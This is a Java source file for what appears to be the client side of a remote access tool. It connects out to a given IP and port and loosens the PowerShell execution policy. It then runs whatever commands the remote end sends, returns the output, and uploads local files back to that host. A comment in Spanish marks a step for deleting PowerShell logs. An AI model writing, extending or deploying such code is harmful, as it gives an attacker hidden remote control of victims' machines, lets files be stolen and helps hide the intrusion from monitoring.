package control;

import java.io.File;
import java.io.IOException;

import com.profesorfalken.jpowershell.PowerShell;
import com.profesorfalken.jpowershell.PowerShellResponse;

import commands.CommandManager;
import connection.Client;

public class Controller {
	private PowerShell powerShell;
	private Client client;
	private String _ip;
	private int _port;
	
	public Controller(String ip, int port) {
		_ip = ip;
		_port = port;
		client = new Client(ip, port);
		powerShell = PowerShell.openSession();
		powerShell.executeCommand("Set-ExecutionPolicy Unrestricted -Scope Process");
	}

	public void run() {
		try {
			connect();
		} catch (IOException e) {
			return;
		}
		while(!client.isClosed()) {
			try {
				CommandManager.parseCommand(client.receive().trim(), this);
			} catch (IOException e1) {
	        	try {
	        		connect();
	        	}
	        	catch(IOException e2) {
	        		return;
	        	}
	        }
		}
	}
	
	public String receiveMsg() throws IOException {
		return client.receive();
	}
	
	public void sendMsg(String message) {
		try {
			client.send(message);
		} catch (IOException e) {
			endConnection();
		}
	}
	
	public void sendFile(File file) throws IOException {
		Thread t = new Thread() {
			public void run() {
				try {
					Client temporary = new Client(_ip, _port);
					temporary.reset();
					temporary.send(file);
					temporary.end();
				}catch(IOException e) {
					System.out.println(e.getMessage());
				}
			}
		};
		
		t.start();
		try {t.join();} catch (InterruptedException e) {}
	}
	
	public String execute(String command) {
		try {
			PowerShellResponse response = powerShell.executeCommand(command);
			return response.getCommandOutput();
		} catch (Exception e) {
			endConnection();
			return null;
		}
	}
	
	public void endConnection(){
		powerShell.close();
		try {
			client.end();
		} catch (IOException e) {} finally{
			//Borrar powerShell logs
		}
	}

	private void connect() throws IOException {
		client.connect();
	}
}
